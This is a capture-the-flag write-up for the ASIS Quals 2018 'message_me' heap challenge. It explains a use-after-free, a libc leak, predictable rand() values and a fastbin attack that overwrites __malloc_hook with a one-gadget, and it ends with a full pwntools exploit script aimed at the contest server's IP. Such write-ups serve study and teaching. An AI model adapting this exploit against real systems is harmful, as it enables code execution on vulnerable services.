---
title:  Asis Quals 2018 Message
updated: 2018-05-01 14:24:55
---

- [message_me](#orga6a7613)


<a id="orga6a7613"></a>

# message_me

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

The program provide the following options

       Message System
    ---------------------
    0 : Add a message
    1 : Remove the message
    2 : Show the message
    3 : Change the timestamp
    ---------------------
    choice :

There is a table in bss which follows this structure

    struct entry
    {
    int timestamp;
    char message[size];
    }

we can create new message entry with the add message option . The change timestamp option adds a random number between 0-9 to the timestamp . The show message option displays the time as a string and displays the message .

There is a UAF on the free option which does not null out the entry even if it is freed . We can do fastbin corruption and allocate a fastbin chunk near __malloc_hook_ and overwrite it with one gadget . But We do not control first 8 bytes of the structure , it will contain the time .

Another thing is that the time is printed with ctime and it uses heap internally so calling the show option will mess up our heap ,

On to the libc leak , creating a chunk will place the a heap pointer on to the table and we will delete it . because of the uaf bug it will be there in the table and the ctime in view option manipulates the heap ( I don't really now what happens inside that function ) and the end result is that we get a libc address of main arena in message section of the object which will be printed out . We have our libc leak .

Next is we have to get the address of __malloc_hook_-0x23 on to the fastbinY array to allocate a chunk on the libc .

The trick is to create a fake chunk ( who's fd points to the libc ) on a the heap and use the change time stamp option to manipulate the fd of the freed fastbin chunk to point to that location . since the seed of the random number generator is fixed we can predict the number generated on every iteration .

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
  srand(1);
  for ( int i = 0 ; i <= 9 ; i++)
    printf("%d\n",rand()%10);

  return 0;
}
```

    3
    6
    7
    5
    3
    5
    6
    2
    9
    1

These same number will be generated on every execution .

We will create two chunk , which the first containing the fake chunk .

```python
payload = p64([                                                                                                                               
    0x0,                                                                                                                                      
    0x0,                                                                                                                                      
    0x71,                                                                                                                                     
    fake_chunk,                                                                                                                               
    0x0,])                                                                                                                                    
create(0x60,payload)                                                                                                                          
create(0x60,"")                                                                                                                               
delete(1)                                                                                                                                     
delete(2)    
```

     +-------------------+
     |       0x71        | -------------> [1]
     +-------------------+			  
     |        fd         | ---> null
     +-------------------+			  
     |                   |			  
     |                   |			  
     |+-----------------+|			  
     ||       0x71      || --------------> [fake_chunk]
     |+-----------------+|	
     ||__malloc_hook-0x23|		       	  
     |+-----------------+|		       	  
     ||                 ||		       	  
     ||                 ||		       	  
     |+-----------------+|		       	  
     +-------------------+		       	  
     |        0x71       | ---------------> [2]
     +-------------------+	
     |        fd         | ----> points to [1]
     +-------------------+	
     |                   |	
     |                   |	
     |                   |	
     |                   |	
     +-------------------+	
    
    fastbinY : [2] -> [1] 

calling change on 2 will add the random number to the fd which points to [1] , we can increment this number to point to out fake chunk

```python
change(2)
change(2)
change(2)
change(2)
change(1)
change(2)
change(2)
```

    fastbinY : [2]  -> [fake_chunk] -> [__malloc_hook-0x23]

We will create two new object and the third will give return a pointer on libc and we can give one gadget to the __malloc_hook . Then just trigger the hook .

```python
from pwn import *
from datetime import datetime

def p64(hex):
    from struct import pack
    return pack('<' + 'Q' * len(hex), *hex)
context.arch = 'amd64'
context.bits = 64
if True:
    context.log_level = "debug"
    io = remote ("159.65.125.233", 6003)
else:
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    env = {'LD_PRELOAD' : './libc.so.6'}
    io = process('./message_me' ,env=env)
    gdb.attach(io,'''

    ''')

def create(size,msg):
        io.recvuntil("choice : ")
        io.sendline(str(0))
        io.recvuntil("Give me the message size : ")
        io.sendline(str(size))
        io.recvuntil("Give me your meesage : ")
        io.sendline(str(msg))

def view(idx):
        io.recvuntil("choice : ")
        io.sendline(str(2))
        io.recvuntil("Give me index of the message : ")
        io.sendline(str(idx))

def delete(idx):
        io.recvuntil("choice : ")
        io.sendline(str(1))
        io.recvuntil("Give me index of the message : ")
        io.sendline(str(idx))

def change(idx):
        io.recvuntil("choice : ")
        io.sendline(str(3))
        io.recvuntil("Give me index of the message : ")
        io.sendline(str(idx))
def leak():
    io.recvuntil("Message : ")
    return u64(io.recv(6) + "\x00\x00")


create(0x20,"A")
delete(0)
view(0)


libc_leak = leak()
libc = libc_leak - 0x3c4b78
fake_chunk = libc + 0x3c4aed
magic = libc + 0xf02a4
log.info("Libc Leak :" +hex(libc))

create(0x20,"A")
delete(1)

payload = p64([
    0x0,
    0x0,
    0x71,
    fake_chunk,
    0x0,])


create(0x60,payload)
create(0x60,"")

delete(2)
delete(3)

change(3)
change(3)
change(3)
change(3)
change(2)
change(3)
change(3)

create(0x60,"")
create(0x60,"")

payload = "\x00" * 0x3
payload += p64([
    0x0,
    magic
])
create(0x60,payload)

delete(1)
io.interactive()
```
